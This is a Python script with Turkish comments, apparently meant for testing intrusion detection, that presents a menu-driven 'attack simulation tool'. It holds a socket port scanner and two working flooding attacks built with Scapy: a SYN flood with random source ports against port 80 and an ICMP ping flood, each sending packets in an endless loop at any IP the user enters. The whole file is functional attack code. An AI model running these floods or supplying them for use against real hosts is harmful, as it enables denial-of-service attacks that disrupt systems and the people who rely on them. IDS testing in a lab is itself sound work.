import socket
import time
import random
import sys
# Scapy kütüphanesini ekledik, böylece sanal değil GERÇEK paket yollayacağız.
from scapy.all import IP, TCP, ICMP, send

def menu_yazdir():
    print("\n" + "="*40)
    print("   SALDIRI SİMÜLASYON ARACI (Gerçek Paketler)")
    print("="*40)
    print("1. Port Tarama (Socket ile Gerçek Bağlantı)")
    print("2. SYN Flood Simülasyonu (Scapy ile Hızlı)")
    print("3. ICMP Flood Simülasyonu (Scapy ile Hızlı)")
    print("4. Çıkış")
    print("="*40)

def port_tarama(hedef_ip):
    # Senin kodundaki yapı korundu, sadece biraz hızlandırma eklendi.
    print(f"\n[*] {hedef_ip} üzerindeki yaygın portlar taranıyor...")
    
    # Taranacak port listesi
    portlar = [21, 22, 80, 443, 3306, 8080]
    
    for port in portlar:
        # Soket nesnesi oluşturma
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2) # Hızlandırdık (0.5 -> 0.2)
        
        # connect_ex hata fırlatmaz, hata kodu döndürür (0 = Başarılı)
        sonuc = s.connect_ex((hedef_ip, port))
        
        if sonuc == 0:
            print(f"[+] Port {port}: AÇIK")
        else:
            # Kapalı portları ekrana yazıp kirletmemek için pass geçiyoruz
            # print(f"[-] Port {port}: KAPALI")
            pass
            
        s.close()

def syn_flood_simulasyonu(hedef_ip):
    print(f"\n[*] {hedef_ip} için SYN Flood başlatılıyor...")
    print("[!] Durdurmak için CTRL+C tuşlarına basın.")
    time.sleep(1)
    
    try:
        # ÖNEMLİ: IDS'in yakalaması için döngüyü sonsuz yaptık.
        # Manuel olarak durdurana kadar saldırı yapar.
        while True:
            sahte_port = random.randint(1024, 65535)
            
            # Scapy ile GERÇEK bir SYN paketi oluşturuyoruz
            # Flags="S" demek SYN paketi demektir.
            pkt = IP(dst=hedef_ip)/TCP(sport=sahte_port, dport=80, flags="S")
            
            # Paketi gönder (verbose=0 sessiz mod, ekrana spam yapmaz)
            send(pkt, verbose=0)
            
            # Ekrana bilgi (isteğe bağlı, her pakette yazarsa yavaşlar)
            # print(f" -> [SYN] {sahte_port} -> {hedef_ip}:80 gönderildi.")
            
            # Çok kısa bekleme (Saldırının etkili olması için süre çok kısa olmalı)
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print("\n[*] Saldırı kullanıcı tarafından durduruldu.")

def icmp_flood_simulasyonu(hedef_ip):
    print(f"\n[*] {hedef_ip} için ICMP (Ping) Flood başlatılıyor...")
    print("[!] Durdurmak için CTRL+C tuşlarına basın.")
    time.sleep(1)
    
    try:
        seq = 0
        while True:
            # Scapy ile GERÇEK bir ICMP (Ping) paketi
            pkt = IP(dst=hedef_ip)/ICMP()
            
            send(pkt, verbose=0)
            
            # print(f" -> [ICMP] Ping -> {hedef_ip} gönderildi.")
            seq += 1
            time.sleep(0.01)

    except KeyboardInterrupt:
        print("\n[*] Saldırı kullanıcı tarafından durduruldu.")

# Ana Program Akışı (Senin orijinal kod yapın)
if __name__ == "__main__":
    while True:
        menu_yazdir()
        secim = input("Seçiminiz (1-4): ")
        
        if secim == '4':
            print("Çıkış yapılıyor...")
            break
        
        # 1, 2 veya 3 seçildiyse IP sor
        if secim == '1' or secim == '2' or secim == '3':
            hedef_ip = input("Hedef IP (Örn: 192.168.1.X): ")
            
            if secim == '1':
                port_tarama(hedef_ip)
            elif secim == '2':
                syn_flood_simulasyonu(hedef_ip)
            elif secim == '3':
                icmp_flood_simulasyonu(hedef_ip)
        else:
            # Geçersiz tuşlama kontrolü
            print("[!] Geçersiz seçim.")